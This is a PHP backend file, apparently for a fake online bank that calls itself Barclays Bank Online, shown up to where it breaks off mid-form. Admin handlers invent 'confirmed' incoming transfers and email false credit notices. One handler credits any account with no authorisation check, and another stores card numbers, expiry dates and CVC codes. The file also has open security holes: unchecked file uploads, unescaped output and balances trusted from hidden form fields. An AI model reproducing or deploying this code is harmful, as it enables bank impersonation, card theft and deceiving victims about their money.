<?php
session_start();
include('library/library.php');
include('master.php');
include('mail_server/index.php');
$member_id = $_SESSION['mem_id'];

//to attach_photo when the user has sample design image
if(isset($_POST['attach_photo'])){
	$design_name = $_POST['design_name'].Date("is");
	$files = $_FILES;
	$dir = "passport/";//folder to upload image to
	$img_name = basename( $_FILES[ "fileToUpload" ][ "name" ]);
	$original_image = $dir.$img_name;
	$file_type = pathinfo($original_image,PATHINFO_EXTENSION);//get the image file type
	$rename = $design_name.".".$file_type;//set the new image file name
	$_SESSION['passport'] = $rename;
upload_img($files, $rename, $dir);//call upload_img function from master.php file

//insert data into database
$db = new Db_conn();
        //update database with the new image
        $table_name = "users";
		$data = array($rename, $_SESSION['user_name']);
        $query_fields = array("field_names"=>array("passport"), "where"=>array("username ="), "data"=>$data);
        $db->update_db($table_name, $query_fields);
        if($db->rows()>0){
			
	        $db->close_db();
			
			//echo "<script>window.location='dashboard/'; </script>";
        }
		echo "<script>window.location=''; </script>";
}//end


if(isset($_POST['submit_photo'])){
	$slogan = $_POST['slogan'];
	$slogan = strip_tags($slogan);
	$files = $_FILES;
	$dir = "cart/img/";//folder to upload image to
	$img_name = basename( $_FILES[ "fileToUpload" ][ "name" ]);
	$original_image = $dir.$img_name;
	$file_type = pathinfo($original_image,PATHINFO_EXTENSION);//get the image file type
	$rename = "bizlogo".rand(1000, 9999).Date("s").".".$file_type;//set the new image file name
upload_img($files, $rename, $dir);//call upload_img function from master.php file

$db = new Db_conn();//intansiate database connection
$table_name = "profile";
$query_fields = array( "field_names"=>array("logo"), "where"=>array("member_id = "), "data"=>array($member_id));
$db->select_data($table_name, $query_fields);//select the previous image file name to delete(unlink)
$old_logo = $db->return_sth()->fetch();
$prev_logo = $old_logo['logo'];

//update database with the new image
$table_name = "profile";
$query_fields = array("field_names"=>array("logo", "slogan"), "where"=>array("member_id ="), "data"=>array($rename,$slogan, $member_id));
$db->update_db($table_name, $query_fields);
if($db->rows()>0){
	
	$db->close_db();
	if($prev_logo !== "?" && $prev_logo !== $rename){
		
		unlink("uploads/".$prev_logo);
	}
	echo "<script> window.location='';</script>";
	exit();
}//end if $row

}//end isset
?>


<?php
if(isset($_POST['submit_quote'])){
			//update add career profile
			unset($_POST['submit_quote']);
			$email = $_POST['email'];
			$description = $_POST['description'];
			$form_data = $_POST;
			$date = Date("Y-m-d");
			$time = Date("H:i:s");
			$validate = new Validation();
			$validate->validate_data($form_data);
			
	if($validate->return_passed() == true){
		$validate->add_valid_data($date);
		$validate->add_valid_data($time);
		$validate->add_valid_data("new");
		if (isset($_SESSION['user_id'])){
		$validate->add_valid_data($_SESSION['user_id']);}else{
		$validate->add_valid_data("guest");	
		}
		$db = new Db_conn();
		$data = $validate->return_valid_data();
		
        $table_name = "req_quote";
        $field_names = array("need", "full_name", "email", "phone_no", "state_addr", "description",  "date", "time", "status", "member_id"); 
        $db->insert_db($table_name, $field_names, $data);
			if($db->rows()>0){
			echo alert_msg("<b>Success:</b> Your quote request was received successfully!  <br> Our professional team will contact you in few hours <br> Thank you", "#ffffff");
			
			
			//mail the user the token and and recovery link
			$sender ="contact@bizrator.com";
	
$headers = "From:Bizrator<$sender>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-type:text/html; charset=iso-8859-1\r\n";
	
	$message = "<HTML><BODY>
	<h4>Request for Quotation</h4><br>
 <span style='color:green;'>Your quotation request was received successfully</span>
 <br>
<p> $description </p> <br>
<b> Our professional team will be in touch with you, just to serve you  better </b> <br>
<p>we are always available to assist you with convenience, printing and branding have not been this easy</p>

  <br>
 <a href='https://www.bizrator.com'> <h3>  Bizrator.com </h3> </a>
 <br>
 <a href='mailto:contact@bizrator.com'><span>contact@bizrator.com</span></a>
 
 </BODY>
 </HTML>";

	
       $master_email= $email; 
	   $subject = "Quotation Confirmation";
	   mail($master_email, $subject, $message, $headers);
	    $master_email= "christomac12@gmail.com"; 
	   mail($master_email, $subject, $message, $headers);
			
			
	exit();
			}//end if rows
	}else{
		echo alert_msg("Error: Some fields are empty! <br> Fill the required field and try again", "#e67878");
	}//end if return_passed
}//end isset
?>


 <?php
if(isset($_POST['comment_set'])){
	
	//insert news comment
	        $news_code = $_POST['comment_set'];
			$email = $_POST['email'];
			unset($_POST['comment_set']);
			unset($_POST['email']);
			$form_data = $_POST;
			$date = Date("Y-m-d H:i:s");
			$validate = new Validation();
			$validate->validate_data($form_data);
			
	if($validate->return_passed() == true){
		if(!empty($email)){
			echo $email;
			$email = strip_tags($email);
		}else{ echo "empty"; $email = "?"; }
		$validate->add_valid_data($email);
		$validate->add_valid_data($news_code);
		$validate->add_valid_data($date);
		$validate->add_valid_data("?");
		$validate->add_valid_data("?");
		$db = new Db_conn();
		$data = $validate->return_valid_data();
		
        $table_name = "news_comment";
        $field_names = array("name", "comment", "email", "news_code", "date", "comm_by", "user_type"); 
        $db->insert_db($table_name, $field_names, $data);
		
			fetch_comment($news_code);
	            echo alert_msg("Posted!", "lightgreen");
	            echo close_modal();
		
	}else{
				echo alert_msg("<b>Error: Some fields are empty!</b> <br> Fill the name field and comment box", "#e67878");

		
	}//end if else return_passed
	
}//end isset $_POST

?>


<?php
if(isset($_POST['submit_register'])){
    $email = $_POST['email'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $re_password = $_POST['re_password'];
	
	$valid = new Validation();
	$valid->validate_password($password, $re_password);

	
    $array_data = array("email"=>$email, "username"=>$username);
    $table_name = "users";//database table name
    $submit_button = "submit_register";
	unset($_POST['captcha']);
    unset($_POST['re_password']);
    unset($_POST['submit_register']);
	$form_data = $_POST;//valid form data

    $validation = new Validation();
    $validation->validate_data($array_data, $submit_button);
if($validation->return_passed() == true){
	
    $query_fields = array("field_names"=>array("email", "username"), "where"=>array("email =", "OR username ="), "data"=>$validation->return_valid_data());
    $db = new Db_conn();
    $db->select_data($table_name, $query_fields);
	$row = $db->return_sth()->fetch();
	
	if($db->return_sth()->rowCount() < 1){
		
	$user_code = rand(time(), 9999);
	$verify_code = rand(1, 999999);
	$account_no = rand(1111111111, 9999999999);
	$date = Date("Y-m-d");
	$time = Date("h:i:sa");
	$validate = new Validation();
	
	$validate->validate_data($form_data, $submit_button);
	$validate->add_valid_data($verify_code);
	$validate->add_valid_data("no");
	$validate->add_valid_data($account_no);
	$validate->add_valid_data("active");
	$validate->add_valid_data($date);
	$validate->add_valid_data($time);
	$validate->add_valid_data($user_code);
	$data = $validate->return_valid_data();
	
	if($validate->return_passed() == true){
		
		//table colunm names
	    $field_names = array("f_name", "l_name", "email", "phone_no", "username", "password", "verify_code", "verify_status", "account_no", "status",  "date", "time", "user_code");
	   
	    //call the method for database insert into the table
		$db->insert_db($table_name, $field_names, $data);//insert into signup table
		
		
		//insert into account_info table
		$field_names = array("username", "account_bal", "total_dep", "total_wid", "wid_pending", "total_trans", "status", "time");
		$data = array($username, 0,0,0,0,0, "block", "21");
		$db->insert_db("account_info", $field_names, $data);
		
		$sender = "Babankonline";
		$headers .= "From:babankonline.com<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
	
	$message = "<HTML><BODY>
	<h3> Hello $username </h3> <br>
	<b> Congratulations! </b>
 Your registration at <a href='https://babankonline.com'>Barclay Bank Online </a> was successful!
 <br>
 <br>
 
 <b>Your Verification Code is: </b> $verify_code;
<br>
<br>
 <div style='background-color:#000066; margin:20px; width:100%; color:#fff; text-align:center;'>
 Click this link <a href=\"https://babankonline.com/login/?status=verify&user=$username\"><b>Verify me</b></a> for Verification
 <br>
 Contact Info@babankonline.com
 </div>
 </BODY>
 </HTML>";

	
       $master_email= $email; 
	   $subject = "Babankonline Verification";
	  mail($master_email, $subject, $message, $headers);
		
		
        if($db->return_sth()->rowCount() > 0){
	        $db->close_db();
	        echo "<b>Registration Successful</b>";
			echo "<script> window.location='../login/?status=verify&user=$username';</script>";
	
        }else{
	
	        echo "<b>Registration Not Successful</b>";
        }//end if else
	}else{
		
		print_r($validate->return_error());
		
	}//end else
	 
	}else{
		echo "<b> Email and Username already exists! </b>";
	}
	//end if 
	
}else{
	print_r($validation->return_error());
}//end if else

echo"<br>*****************************************************<br>";

}//end isset register

?>



<?php
if(isset($_POST['submit_credit'])){
	 $amount = $_POST['amount'];
    $user_name = $_POST['user'];
	
	$table_name = "account_info";
	$data = array($amount, $user_name);
	//table colunm names
	    $query_fields = array("field_names"=>array("account_bal"), "where"=>array("username ="), "data"=>$data);
	   $db = new Db_conn();
	    //call the method for database update
		$db->update_db($table_name, $query_fields);//update verification status table
		
        if($db->return_sth()->rowCount() > 0){
	        $db->close_db();
	        echo "<b> User Account Credited Successfully <br> Amount: $ $amount <br> User: $user_name</b>";
			//echo "<script> window.location='../login/?status=verify&user=$username';</script>";
	
        }else{
	
	        echo "<b>Operation failed! Try Again</b>";
        }//end if else
	
}//end submit_credit
?>


<?php
if(isset($_POST['submit_change_days'])){
	
	
	
	 $days = $_POST['days'];
	 $username = $_POST['username'];
	 $date = Date("Y-m-d h:i:s");
	
	$table_name = "account_info";
	$data = array($days, $date, $username);
	//table colunm names
	    $query_fields = array("field_names"=>array("time", "date"), "where"=>array("username ="), "data"=>$data);
	   $db = new Db_conn();
	    //call the method for database update
		$db->update_db($table_name, $query_fields);//update verification status table
		
        if($db->return_sth()->rowCount() > 0){
	        $db->close_db();
	        echo "<b> Change Successful! </b>";
			echo "<script> window.location='';</script>";
	
        }else{
	
	        echo "<b>Operation failed! Try Again</b>";
        }//end if else
	
}//end submit_change_days
?>


<?php
if(isset($_POST['submit_change'])){
    $old_password = $_POST['old_password'];
    $new_password = $_POST['new_password'];
    $confirm_password = $_POST['confirm_password'];
	
	$valid = new Validation();
	$valid->validate_password($new_password, $confirm_password);

	
    $array_data = array("password"=>$old_password, "username"=>$_SESSION['user_name']);
    $table_name = "users";//database table name
    $submit_button = "submit_change";
    unset($_POST['confirm_password']);
    //unset($_POST['old_password']);
    unset($_POST['submit_change']);
	$form_data = $_POST;//valid form data

    $validation = new Validation();
    $validation->validate_data($form_data, $submit_button);
if($validation->return_passed() == true){
	$validation->add_valid_data($_SESSION['user_name']);
	$data = $validation->return_valid_data();
	$check_pw = array($data[0], $data[2]);
	
    $query_fields = array("field_names"=>array("username"), "where"=>array("password =", "AND username ="), "data"=>$check_pw);
    $db = new Db_conn();
    $db->select_data($table_name, $query_fields);
	$row = $db->return_sth()->fetch();
	
	if($db->return_sth()->rowCount() > 0){
	$date = Date("Y-m-d");
	$time = Date("h:i:s");
		$username = $row['username'];
		$data = $validation->return_valid_data();
		$data= array($data[1], $data[2]);
		
		//table colunm names
	    $query_fields = array("field_names"=>array("password"), "where"=>array("username ="), "data"=>$data);
	   $db = new Db_conn();
	    //call the method for database update
		$db->update_db($table_name, $query_fields);//update verification status table
		
        if($db->return_sth()->rowCount() > 0){
	        $db->close_db();
	        echo "<b> Password Changed Successfully</b>";
			//echo "<script> window.location='../login/?status=verify&user=$username';</script>";
	
        }else{
	
	        echo "<b>Password Reset Was Not Successful</b>";
        }//end if else
	 
	}else{
		echo "<b> Password Does Not Exist! </b>";
	}
	//end if 
	
}else{
	print_r($validation->return_error());
}//end if else

echo"<br><br>";

}//end isset

?>


<?php
if(isset($_POST['submit_trans_own'])){
    $account_no = $_POST['account_no'];
    $amount = $_POST['amount'];
	$data = array($account_no);
	
    $query_fields = array("field_names"=>array("account_no", "username"), "where"=>array("account_no ="), "data"=>$data);
    $db = new Db_conn();
	$table_name = "users";
    $db->select_data($table_name, $query_fields);
	$row = $db->return_sth()->fetch();
	$charge = (10/100)*$amount;
	$total = $charge + $amount;
	
	if($db->return_sth()->rowCount() > 0){
		
		$data = array($_SESSION['user_name']);
		$query_fields = array("field_names"=>array("account_bal"), "where"=>array("username ="), "data"=>$data);
   
	$table_name = "account_info";
    $db->select_data($table_name, $query_fields);
	$row = $db->return_sth()->fetch();
	$balance = $row['account_bal'];
	
	if($balance > $amount){
		
		echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'> <center> <h5> <b>Transfer Preview </b></h5> </center>
		<form id='trans_own_final' method='post' enctype='multipart/form-data' action='../ajax_submit.php'>
<span class='input_title'>Account Number </span>
  <input id='account_no' class='modal_input' type='text' name='account_no' value='$account_no' disabled='disabled'>
  <input id='account_no' class='modal_input' type='hidden' name='account_no' value='$account_no'>
  
  
  <span class='input_title'>Amount </span>
  <input id='amount' class='modal_input' type='text' name='amount' value='USD $amount' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='amount' value='$amount' >
  
  <span class='input_title'>Charge </span>
  <input id='amount' class='modal_input' type='text' name='charge' value='USD $charge' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='charge' value='$charge'>
  
  <span class='input_title'>Total </span>
   <input id='total' class='modal_input' type='text' name='total' value='USD $total' disabled='disabled'>
  <input id='total' class='modal_input' type='hidden' name='total' value='$total'>
  <input id='balance' class='modal_input' type='hidden' name='balance' value='$balance'>
  
 <center>
 <input type='hidden' name='trans_own_final'>
 <button onclick=\"ajax_sub('trans_own_final');\"  id='signup_user' class='site-btn' type='submit' name='trans_own_final'>Transfer</button> 
 </center>
 </form>
 </div>";
		//echo "<script> window.location='../transfer-own-bank/?preview=yes&amt=$amount';</script>";
		
	}else{
		
		echo "You have insufficient fund to perform this transactioin";
	}//end bal
		
		
		
	}else{
		
		echo "Invalid Account Number!";
	}

}//end isset trans_own

?>


<?php
if(isset($_POST['trans_own_final'])){
    $account_no = $_POST['account_no'];
    $amount = $_POST['amount'];
    $charge = $_POST['charge'];
	$data = array($account_no);
	
	$after_balance = ($_POST['balance'] - $_POST['total']);
	$description = "Fully authorized transfer of USD $amount to account: $account_no. Transfer charge: $charge Balance: $balance";
	$date = Date("Y-m-d h:i:s");
		//insert into own-bank table
		$field_names = array("username", "recipient_acc", "amount", "description", "after_balance", "date", "status");
		$data = array($_SESSION['user_name'], $_POST['account_no'], $_POST['amount'], $description, $after_balance, $date, "authorized");
		 $db = new Db_conn();
		$db->insert_db("own_bank", $field_names, $data);
	
	
	     $data = array($after_balance, $_SESSION['user_name']);
	    //table colunm names
	    $query_fields = array("field_names"=>array("account_bal"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("account_info", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
	        echo "<b>  <i class='fa fa-check' style='color:yellow; font-size:20px;'></i> <br> Transfer Successful! </b> <br> <span style='color:yellow;'> Wait for 24 - 48hours for  approval </span>";
			//echo "<script> window.location='../login/';</script>";
	
        }else{
	
	        echo "<b>Transfer was Not Successful</b>";
        }//end if else	
	
}//end trans_own_final
?>


	<?php
if(isset($_POST['submit_trans_other'])){
    $account_no = $_POST['account_no'];
    $amount = $_POST['amount'];
    $email = $_POST['email'];
    $bank_name = $_POST['bank'];
    $details = $_POST['details'];
	
	$charge = (10/100)*$amount;
	$total = $charge + $amount;
		
		$data = array($_SESSION['user_name']);
		$query_fields = array("field_names"=>array("account_bal"), "where"=>array("username ="), "data"=>$data);
   
    $db = new Db_conn();
	$table_name = "account_info";
    $db->select_data($table_name, $query_fields);
	$row = $db->return_sth()->fetch();
	$balance = $row['account_bal'];
	
	if($balance > $amount){
		
		echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'> <center> <h5> <b>Transfer Preview </b></h5> </center>
		<form id='trans_other_final' method='post' enctype='multipart/form-data' action='../ajax_submit.php'>
<span class='input_title'>Bank Name</span>
  <input id='account_no' class='modal_input' type='text' name='bank_name' value='$bank_name' disabled='disabled'>
  <input id='account_no' class='modal_input' type='hidden' name='bank_name' value='$bank_name'>
  
  
  <span class='input_title'>Amount </span>
  <input id='amount' class='modal_input' type='text' name='amount' value='USD $amount' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='amount' value='$amount' >
  
  <span class='input_title'>Charge </span>
  <input id='amount' class='modal_input' type='text' name='charge' value='USD $charge' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='charge' value='$charge'>
  
  <span class='input_title'>Total </span>
   <input id='total' class='modal_input' type='text' name='total' value='USD $total' disabled='disabled'>
  <input id='total' class='modal_input' type='hidden' name='total' value='$total'>
  
  
  <span class='input_title'>Processing Time </span>
   <input id='total' class='modal_input' type='text' name='process_time' value='Within 24 Hours' disabled='disabled'>
   <input id='total' class='modal_input' type='hidden' name='process_time' value='Within 24 hours'>
   
   <span class='input_title'>Email</span>
   <input id='total' class='modal_input' type='text' name='email' value='$email' disabled='disabled'>
    <input id='total' class='modal_input' type='hidden' name='email' value='$email'>
	
	<span class='input_title'>Account Number</span>
   <input id='total' class='modal_input' type='text' name='account_no' value='$account_no' disabled='disabled'>
    <input id='total' class='modal_input' type='hidden' name='account_no' value='$account_no'>
	
	
	<span class='input_title'>Transfer Details</span>
   <input id='total' class='modal_input' type='text' name='details' value='$details' disabled='disabled'>
    <input id='total' class='modal_input' type='hidden' name='details' value='$details'>
  
  
  <input id='balance' class='modal_input' type='hidden' name='balance' value='$balance'>
  
 <center>
 <input type='hidden' name='trans_other_final'>
 <button onclick=\"ajax_sub('trans_other_final');\"  id='signup_user' class='site-btn' type='submit' name='trans_own_final'>Transfer</button> 
 </center>
 </form>
 </div>";
		//echo "<script> window.location='../transfer-own-bank/?preview=yes&amt=$amount';</script>";
		
	}else{
		
		echo "You have insufficient fund to perform this transactioin";
	}//end bal
		
		

}//end isset trans_other

?>



<?php
if(isset($_POST['trans_other_final'])){
    $account_no = $_POST['account_no'];
    $amount = $_POST['amount'];
    $charge = $_POST['charge'];
    $bank_name = $_POST['bank_name'];
    $process_time = $_POST['process_time'];
	
	$after_balance = ($_POST['balance'] - $_POST['total']);
	$description = "Fully authorized transfer of USD $amount to account: $account_no. <br>
	Transfer charge: $charge Balance: $balance <br> Bank: $bank_name";
	$date = Date("Y-m-d h:i:s");
		//insert into own-bank table
		$field_names = array("username", "account_no", "amount", "account_info", "after_balance", "process_time", "date", "status");
		$data = array($_SESSION['user_name'], $account_no, $amount, $description, $after_balance, $process_time, $date, "pending");
		 $db = new Db_conn();
		$db->insert_db("other_bank", $field_names, $data);
	
	
	     $data = array($after_balance, $_SESSION['user_name']);
	    //table colunm names
	    $query_fields = array("field_names"=>array("account_bal"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("account_info", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
						
			//send mail
			$user = get_user($_SESSION['user_name']);
	
  $to = $user['email'];
//$cc = $_POST['cc'];
 $subject = "Transfer Successful";
/*
      $mailer = new PHPMailer\PHPMailer\PHPMailer();
         $mailer->From ='info@babankonline.com';
         $mailer->FromName='Barclays Bank Online';
         $mailer->Subject = $subject;
         $mailer->AddReplyTo('info@babankonline.com');
		 $mailer->AddAddress($to);
        if(!empty($cc)){$mailer->addCC($cc);}
        //if(!empty($bcc)){$mailer->addBCC($bcc);}
		
			$userN = ucfirst($user['username']);
			$email = $user['email'];
			$mailer->AddAddress($email);
	

               $mailer->IsHTML(true);

         $mailer->AddEmbeddedImage('logo_bank.png', 'logo', 'logo_bank.png');
         $mailer->Body =" <div style='width:98%; margin:0 auto; padding:5px;'> <img src=\"cid:logo\" alt=\"Barclays Bank Logo\" height=\"200\"  width=\"150\"/> </div>
		 <br>
		 <br>
		 Hello <b> $userN </b> <br> <br>
		 <center> <h4 style='color:green;'>Transaction Successful</h4> </center>
		 <br>
		 <p> Your transfer will be confirmed within 24 to 48 hours.</p>
		 <br>
         <div>
         <table border=0>
		 <tr><td><b>Amount:</b></td><td> $ $amount</td> </tr>
		 <tr><td><b>Bank Name:</b></td><td> $bank_name </td> </tr>
		 <tr><td><b>Account No:</b></td><td> $account_no </td> </tr>
		 <tr><td><b>Balance:</b></td><td>$  $after_balance </td> </tr>
		 <tr><td><b>Date of transfer:</b> </td><td>  $date </td> </tr>
		
		 </table>
		 </div> <br>
     <p>
    <hr> <a href='https://www.babankonline.com'><img src=\"cid:logo\" alt=\"Barclays Bank Logo\" height=\"150\"  width=\"100\"/><br>Barclays Bank Online</a> </p>";
	
	$mailer->Send();
			*/
			
	       echo "<b> <i class='fa fa-check' style='color:yellow; font-size:20px;'></i> <br> Transfer Successful! </b> <br> <span style='color:yellow;'> Wait for 24 - 48hours for transaction approval </span>";
			echo "<script> document.getElementById('trans_other_bank').reset();</script>";
			//echo "<script> window.location='../login/';</script>";
	
        }else{
	
	        echo "<b>Transfer was Not Successful</b>";
        }//end if else	
	
}//end trans_own_final
?>


<?php
if(isset($_POST['submit_admin_trans'])){
	$username = $_POST['username'];
	$balance = $_POST['balance'];
	$email = $_POST['email'];
	
echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'> <center> <h5> <b>Enter Transfer Details </b></h5> </center>
		<form id='admin_trans_final' method='post' enctype='multipart/form-data' action='../../ajax_submit.php'>
		
<span class='input_title'>Bank Name</span>
  <input id='account_no' class='modal_input' type='text' name='bank_name' placeholder='Enter bank name' required='required'>
  
  <span class='input_title'>Account Name</span>
   <input id='total' class='modal_input' type='text' name='account_name'  placeholder='Enter account name' required='required'>
  
  <span class='input_title'>Account Number</span>
   <input id='total' class='modal_input' type='text' name='account_no' placeholder='Enter account no' required='required'>
  
  
  <span class='input_title'>Amount </span>
  <input id='amount' class='modal_input' type='text' name='amount'  placeholder='Enter amount' required='required'>

  <span class='input_title'>Swift Code </span>
  <input id='amount' class='modal_input' type='text' name='swift_code'  placeholder='swift_code' required='required'>
   
   <span class='input_title'>Email</span>
   <input id='total' class='modal_input' type='text' name='email' placeholder='Enter email' required='required'>
	
	
	<span class='input_title'>Transfer Details</span>
	<textarea name='details' class='form-control'></textarea>
  
  <input id='balance' class='modal_input' type='hidden' name='username' value='$username'>
  <input id='balance' class='modal_input' type='hidden' name='after_balance' value='$balance'>
  <input id='balance' class='modal_input' type='hidden' name='email' value='$email'>
  
  <br>
 <center>
 <input type='hidden' name='admin_trans_final'>
 <button onclick=\"ajax_sub('admin_trans_final');\"  id='signup_user' class='site-btn' type='submit' name='trans_own_final'>Transfer</button> 
 </center>
 </form>
 </div>";
}//end if isset submit_admin_trans
?>



<?php
if(isset($_POST['admin_trans_final'])){
    $account_no = $_POST['account_no'];
    $amount = $_POST['amount'];
    $swift_code = $_POST['swift_code'];
    $bank_name = $_POST['bank_name'];
    $account_name = $_POST['account_name'];
    $process_time = "Within 24 hours";
	$after_balance = $_POST['after_balance'] + $amount;
	$username = $_POST['username'];
	$email = $_POST['email'];
	
	$description = "Authorized transfer of <b> USD $amount </b>was credited to your account by <b> $account_name </b> from  <b> $bank_name </b>. Swift code: <b> $swift_code </b>. After balance: $after_balance ";
	$date = Date("Y-m-d h:i:s");
		//insert into own-bank table
		$field_names = array("username", "account_no", "amount", "account_info", "after_balance", "process_time", "date", "status");
		$data = array($username, $account_no, $amount, $description, $after_balance, $process_time, $date, "confirmed");
		
		 $db = new Db_conn();
		$db->insert_db("other_bank", $field_names, $data);
	
	
	     $data = array($after_balance, $username);
	    //table colunm names
	    $query_fields = array("field_names"=>array("account_bal"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("account_info", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();
			//send statement the user
			$sender = "Babankonline";
		$headers .= "From:babankonline.com<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
	
	$message = "<HTML><BODY>
	<h3> Hello $username
	<b> Transaction Credit! </b>
	<br>
	Bank Name: $bank_name <br>
	Account Number: $account_no <br>
	Account Name: $account_name <br>
	Swift Code: $swift_code <br>
	Balance: $after_balance .
 <br>
 
<div style='background-color:#000066; margin:20px; width:100%; color:#fff; text-align:center;'>
 <a href=\"https://babankonline.com\"><b>Barclays Online Bank</b></a> 
 
 Contact Info@babankonline.com
 </div>
 
 </BODY>
 </HTML>";

	
       $master_email= $email; 
	   $subject = "Babankonline Transaction Statement";
	  mail($master_email, $subject, $message, $headers);
			
	        echo "<b> <b>Transfer Successful </b> </b>";
			echo "<script> window.location='';</script>";
	
        }else{
	
	        echo "<b>Transfer was Not Successful</b>";
        }//end if else	
	
}//end admin_trans_final
?>

<?php
if(isset($_POST['admin_edit_bal'])){
	$username = $_POST['username'];
	$balance = $_POST['account_bal'];
	$total_dep = $_POST['total_dep'];
	$total_wid = $_POST['total_wid'];
	
echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'> <center> <h5> <b>Edit User Balance </b></h5> </center>
		<form id='admin_edit_bal_final' method='post' enctype='multipart/form-data' action='../../ajax_submit.php'>
		
<span class='input_title'>Account Balance</span>
  <input id='account_no' class='modal_input' type='text' name='account_bal' value='$balance' required='required'>
  
  <span class='input_title'>Total Deposit</span>
   <input id='total' class='modal_input' type='text' name='total_dep'  value='$total_dep' required='required'>
  
  <span class='input_title'>Total Withdrawal</span>
   <input id='total' class='modal_input' type='text' name='total_wid' value='$total_wid' required='required'>

  <input id='balance' class='modal_input' type='hidden' name='username' value='$username'>
  
  <br>
 <center>
 <input type='hidden' name='admin_edit_bal_final'>
 <button onclick=\"ajax_sub('admin_edit_bal_final');\"  id='signup_user' class='site-btn' type='submit' name='trans_own_final'>Transfer</button> 
 </center>
 </form>
 </div>";
}//end if isset admin_edit_bal_final
?>


<?php
if(isset($_POST['admin_edit_bal_final'])){
	
    $account_bal = $_POST['account_bal'];
    $total_dep = $_POST['total_dep'];
    $total_wid = $_POST['total_wid'];
	$username = $_POST['username'];
	
	     $data = array($account_bal, $total_dep, $total_wid, $username);
	    //table colunm names
	    $query_fields = array("field_names"=>array("account_bal", "total_dep", "total_wid"), "where"=>array("username ="), "data"=>$data);
	  
	    //call the method for database update
		 $db = new Db_conn();
		$db->update_db("account_info", $query_fields);//update verification status table
		
	 if($db->rows()>0){
	        $db->close_db();

	        echo "<b> <b>Update Successful </b> </b>";
			echo "<script> window.location='';</script>";
	
        }else{
	
	        echo "<b>Update was Not Successful</b>";
        }//end if else	
	
}//end admin_edit_bal_final
?>


<?php
if(isset($_POST['submit_credit_card'])){
    $user = $_POST['user'];
    $amount = $_POST['amount'];
	
		
		echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'>
		<center> <h5><b> Credit Card Transfer </b> </h5> </center>
		<form id='credit_card_final' method='post' enctype='multipart/form-data' action='../ajax_submit.php'>
  
  <span class='input_title'>Amount </span>
  <input id='amount' class='modal_input' type='text' name='amount' value='USD $amount' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='amount' value='$amount' >
  
  <span class='input_title'>Card Name </span>
  <input id='amount' class='modal_input' type='text' name='card_name' placeholder='Card Name' required='required'>
  
  <span class='input_title'>Card Number </span>
  <input id='amount' class='modal_input' type='text' name='card_no' placeholder='Card Number' required='required'>

  <span class='input_title'>Expiration Date </span>
  <input id='amount' class='modal_input' type='text' name='exp_date' placeholder='MM/YYYY' required='required'>
  
  <span class='input_title'>CVC Code </span>
  <input id='amount' class='modal_input' type='text' name='cvc_code' placeholder='cvc' required='required'>
  
 <center>
 <input type='hidden' name='credit_card_final'>
 <button onclick=\"ajax_sub('credit_card_final');\"  id='signup_user' class='site-btn' type='submit' name='trans_own_final'>Deposit</button> 
 </center>
 </form>
 </div>";

}//end isset submit_credit_card

?>


<?php
if(isset($_POST['credit_card_final'])){
    $submit_button = "credit_card_final";
    unset($_POST['confirm_password']);
    //unset($_POST['old_password']);
    unset($_POST['credit_card_final']);
	$form_data = $_POST;//valid form data
	$date = Date("Y-m-d h:i:s");
	
	$validation = new Validation();
    $validation->validate_data($form_data, $submit_button);
if($validation->return_passed() == true){
	$validation->add_valid_data("pending");
	$validation->add_valid_data($date);
	$validation->add_valid_data($_SESSION['user_name']);
	$data = $validation->return_valid_data();
	
		//insert into own-bank table
		$field_names = array("amount", "card_name", "card_no", "exp_date", "cvc_code", "status", "date", "username");
		 $db = new Db_conn();
		$db->insert_db("card", $field_names, $data);
	
	 if($db->rows()>0){
	        $db->close_db();
	        echo "<b> Credit Card Deposit Processing! <br> Awaiting Confirmation </b>";
			//echo "<script> window.location='../login/';</script>";
	
        }else{
	
	        echo "<b>Credit Card Deposit was Not Successful</b>";
        }//end if else	
	}else{
	print_r($validation->return_error());
}//end if else
}//end credit_card_final
?>


<?php
if(isset($_POST['submit_paypal'])){
        $user = $_POST['user'];
    $amount = $_POST['amount'];
	$charge = 2/100 * $amount;
	$total = $charge + $amount;
		
		echo "<div style='background-color:#f5f5f5; margin:10px; width:400px; text-align:left; border:1px solid grey; border-radius:8px; padding:5px; color:#000066;'> <center> <h5> <b>Deposit Preview (Paypal) </b></h5> </center>
		<form id='paypay_final' method='post' enctype='multipart/form-data' action='../ajax_submit.php'>
<span class='input_title'>Amount</span>
  <input id='account_no' class='modal_input' type='text' name='amount' value='$amount' disabled='disabled'>
  <input id='account_no' class='modal_input' type='hidden' name='amount' value='$amount'>
  
  
  <span class='input_title'>Charge </span>
  <input id='amount' class='modal_input' type='text' name='charge' value='USD $charge' disabled='disabled'>
  <input id='amount' class='modal_input' type='hidden' name='charge' value='$charge' >
  
  <span class='input_title'>Total </span>
   <input id='total' class='modal_input' type='text' name='total' value='USD $total' disabled='disabled'>
